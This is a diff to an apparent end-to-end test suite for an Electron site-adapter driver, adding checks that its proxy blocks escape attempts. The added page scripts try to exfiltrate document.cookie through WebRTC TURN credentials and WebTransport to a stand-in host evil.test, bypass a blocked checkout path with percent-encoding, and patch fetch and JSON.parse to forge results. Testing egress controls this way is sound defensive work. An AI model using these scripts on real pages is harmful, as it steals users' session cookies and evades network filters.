@@ -8,6 +8,7 @@
 
 import { X509Certificate } from 'node:crypto'
 import { mkdtempSync } from 'node:fs'
+import { connect } from 'node:net'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { type AdapterManifest, parseManifest, SecretValue, SiteAdapterError } from '@siteadapter/core'
@@ -51,8 +52,53 @@ function manifest(site: TestSite): AdapterManifest {
     secrets: {},
     session: { cookieDomains: ['site.test'], probe: { kind: 'cookie', name: 'sid' } },
     auth: { steps: [{ op: 'assertLoggedIn' }] },
+    requests: [{ method: 'GET', path: '/echo', purpose: 'read' }],
+    limits: { requestsPerRun: 5 },
     tools: [{ name: 'noop', title: 'Noop', description: 'Nothing', sideEffect: 'read' }],
   })
+}
+
+/** Page script: WebRTC to evil.test, by TURN over TCP and TLS (carrying the cookie), TURN over UDP and STUN. */
+const WEBRTC_ATTEMPT = `(async () => {
+  try {
+    const pc = new RTCPeerConnection({
+      iceServers: [
+        { urls: 'turn:evil.test:' + args.tcp + '?transport=tcp', username: 'cookie-' + document.cookie, credential: 'x' },
+        { urls: 'turns:evil.test:' + args.tcp + '?transport=tcp', username: 'cookie', credential: 'x' },
+        { urls: 'turn:evil.test:' + args.udp + '?transport=udp', username: 'cookie', credential: 'x' },
+        { urls: 'stun:evil.test:' + args.udp },
+      ],
+    })
+    pc.createDataChannel('x')
+    await pc.setLocalDescription(await pc.createOffer())
+    await new Promise((resolve) => {
+      pc.onicegatheringstatechange = () => { if (pc.iceGatheringState === 'complete') resolve() }
+      setTimeout(resolve, 4000)
+    })
+    pc.close()
+    return 'gathered'
+  } catch { return 'threw' }
+})()`
+
+/** Page script: a WebTransport (HTTP/3 over QUIC, so UDP) session to evil.test. */
+const WEBTRANSPORT_ATTEMPT = `(async () => {
+  try {
+    const transport = new WebTransport('https://evil.test:' + args.udp + '/wt')
+    await Promise.race([transport.ready, new Promise((_, reject) => setTimeout(() => reject(new Error('t')), 2000))])
+    return 'ready'
+  } catch { return 'failed' }
+})()`
+
+/** Runs each attempt through `run` and counts what reached the stand-in servers for each. */
+async function socketAttempts(site: TestSite, run: (script: string) => Promise<unknown>) {
+  const measure = async (script: string) => {
+    const tcp = site.tcpConnections()
+    const udp = site.udpDatagrams()
+    const outcome = await run(script)
+    await sleep(500)
+    return { outcome, tcp: site.tcpConnections() - tcp, udp: site.udpDatagrams() - udp }
+  }
+  return { webrtc: await measure(WEBRTC_ATTEMPT), webtransport: await measure(WEBTRANSPORT_ATTEMPT) }
 }
 
 type Outcome<T> = { ok: T } | { error: { stage: string; errorClass: string } | { other: string } }
@@ -105,17 +151,28 @@ async function setup() {
       return false
     }
   }
-  for (const partition of ['persist:auth:e2e', 'persist:tool:e2e']) {
+  for (const partition of ['persist:auth:e2e', 'persist:tool:e2e', 'e2e-control']) {
     session.fromPartition(partition).setCertificateVerifyProc((request, callback) => {
       callback(trusted(request.certificate.data) ? 0 : -2)
     })
   }
   const blocked: BlockedRequest[] = []
-  const driver = await createElectronSessionDriver(manifest(site), {
-    onBlocked: (b) => blocked.push(b),
-    typingDelayMs: 15,
-    stepTimeoutMs: 10_000,
-  })
+  const driver = await createElectronSessionDriver(
+    manifest(site),
+    {
+      onBlocked: (b) => blocked.push(b),
+      typingDelayMs: 15,
+      stepTimeoutMs: 10_000,
+      egressPorts: [site.port],
+    },
+    {
+      // The proxy resolves hostnames itself; only the test hosts exist, and they are all local.
+      dial: (host, port) => {
+        if (!host.endsWith('.test')) throw new Error('the e2e suite never leaves the machine')
+        return connect({ host: '127.0.0.1', port })
+      },
+    },
+  )
   const login = site.url('site.test', '/login')
   const evilRequests = () => site.requests.filter((r) => r.host.endsWith('evil.test'))
   // Any request anywhere, other than the two forms a canary is meant for, that carries it.
@@ -174,6 +231,7 @@ async function setup() {
 
     typeSecretInSameOriginFrame: async () => {
       const page = await openLogin()
+      await page.inspect('#code')
       await page.focus('#code')
       const secret = SecretValue.fromString(CANARY)
       await page.type(secret)
@@ -186,6 +244,7 @@ async function setup() {
 
     typeSecretInCrossOriginFrame: async () => {
       const page = await openLogin()
+      await page.inspect('#password')
       const focus = await settle(page.focus('#password'))
       const secret = SecretValue.fromString(CANARY)
       const typed = await settle(page.type(secret))
@@ -227,6 +286,7 @@ async function setup() {
     },
 
     egress: async () => {
+      driver.beginRun('read')
       const page = await driver.toolPage()
       const evil = site.url('evil.test', '/collect')
       const refused = await settle(page.fetch(evil))
@@ -248,6 +308,105 @@ async function setup() {
       return { refused, attempts, allowed, blocked: [...blocked], evil: evilRequests() }
     },
 
+    surface: async () => {
+      driver.beginRun('read')
+      const page = await driver.toolPage()
+      await page.goto(site.url('site.test', '/'))
+      const from = blocked.length
+      const attempts = await settle(
+        page.evaluate(
+          `(async () => {
+            const tried = async (url, init) => { try { await fetch(url, init); return 'sent' } catch { return 'failed' } }
+            return {
+              checkout: await tried('/checkout/pay', { method: 'POST', body: 'x' }),
+              encoded: await tried('/check%6Fut/pay', { method: 'POST', body: 'x' }),
+              undeclared: await tried('/apis/orders'),
+              wrongMethod: await tried('/echo', { method: 'DELETE' }),
+              beacon: navigator.sendBeacon('/collect', 'x'),
+            }
+          })()`,
+        ),
+      )
+      // A form POST that a trusted click submits: a navigation, not a fetch.
+      await page.goto(site.url('site.test', '/pay-form'))
+      const click = await settle(page.click('#pay'))
+      await sleep(500)
+      // A navigation that adapter code starts by itself. The cancelled POST left Chromium's error
+      // page behind, so start from a page on the site again.
+      await page.goto(site.url('site.test', '/'))
+      await settle(page.evaluate(`(location.href = '/payments/new', null)`))
+      await sleep(500)
+      // The ceiling: five API calls a run, and the sixth is cut off. Back to a page on the site.
+      await page.goto(site.url('site.test', '/'))
+      driver.beginRun('read')
+      const calls: Outcome<{ status: number }>[] = []
+      for (let i = 0; i < 6; i++) calls.push(await settle(page.fetch('/echo')))
+      driver.endRun()
+      const seen = site.requests
+        .filter((r) => r.host === 'site.test')
+        .map((r) => `${r.method} ${r.path}`)
+        .filter((r) => /checkout|check%6Fut|payment|\/apis\/orders|DELETE|\/collect/.test(r))
+      return {
+        attempts,
+        click,
+        calls: calls.map((c) => ('ok' in c ? c.ok.status : c.error)),
+        reasons: blocked.slice(from).map((b) => `${b.method} ${b.resourceType} ${b.reason}`),
+        seen,
+      }
+    },
+
+    sockets: async () => {
+      const page = await driver.toolPage()
+      const from = blocked.length
+      const args = { tcp: site.tcpPort, udp: site.udpPort }
+      const attempts = await socketAttempts(site, (script) => settle(page.evaluate(script, args)))
+      return {
+        ...attempts,
+        refusedConnects: blocked
+          .slice(from)
+          .filter((b) => b.method === 'CONNECT')
+          .map((b) => b.target),
+      }
+    },
+
+    // The same attempts from a window with only Electron's WebRTC IP policy and no proxy, which is
+    // where the driver stood before. If these connect, the test above is not passing vacuously.
+    socketsWithoutProxy: async () => {
+      const window = new BrowserWindow({
+        show: false,
+        webPreferences: { partition: 'e2e-control', sandbox: true },
+      })
+      window.webContents.setWebRTCIPHandlingPolicy('disable_non_proxied_udp')
+      // The same egress filter the tool partition had before the proxy: evil.test is not on it.
+      session.fromPartition('e2e-control').webRequest.onBeforeRequest((details, callback) => {
+        callback({ cancel: !new URL(details.url).hostname.endsWith('site.test') })
+      })
+      await window.loadURL(site.url('site.test', '/'))
+      const args = JSON.stringify({ tcp: site.tcpPort, udp: site.udpPort })
+      const attempts = await socketAttempts(site, (script) =>
+        window.webContents.executeJavaScript(`((args) => (${script}))(${args})`),
+      )
+      window.destroy()
+      return attempts
+    },
+
+    // Adapter code patches everything the runtime's FETCH script uses, in the world it runs in.
+    worlds: async () => {
+      driver.beginRun('read')
+      const page = await driver.toolPage()
+      await page.goto(site.url('site.test', '/'))
+      await page.evaluate(
+        `(window.fetch = async () => new Response('{"forged":true}', { status: 299 }),
+          JSON.parse = () => ({ forged: true }),
+          Response.prototype.text = async () => '{"forged":true}',
+          window.__patched = true)`,
+      )
+      const fetched = await page.fetch('/echo')
+      const adapterSees = await page.evaluate('window.__patched === true')
+      driver.endRun()
+      return { fetched, adapterSees }
+    },
+
     hints: async () => {
       const page = await driver.toolPage()
       await page.goto(site.url('site.test', '/hints'))
@@ -259,6 +418,7 @@ async function setup() {
     },
 
     handoff: async () => {
+      driver.beginRun('read')
       const tool = await driver.toolPage()
       await tool.evaluate(
         `(document.cookie = 'planted=from-tool; Path=/; Secure', localStorage.setItem('planted', 'x'))`,
@@ -291,15 +451,13 @@ async function setup() {
       await handed
       const hiddenAfter = window?.isVisible() === false
       const aliveAfterClose = window?.isDestroyed() === false
+      // Only the close that ended the hand-off is intercepted; the next one (app quit sends one to
+      // every window) closes the window.
+      window?.close()
+      await sleep(200)
+      const secondCloseDestroyed = window?.isDestroyed()
       await page.close()
-      return {
-        hiddenBefore,
-        shown,
-        title,
-        hiddenAfter,
-        aliveAfterClose,
-        destroyedByPageClose: window?.isDestroyed(),
-      }
+      return { hiddenBefore, shown, title, hiddenAfter, aliveAfterClose, secondCloseDestroyed }
     },
 
     close: async () => {
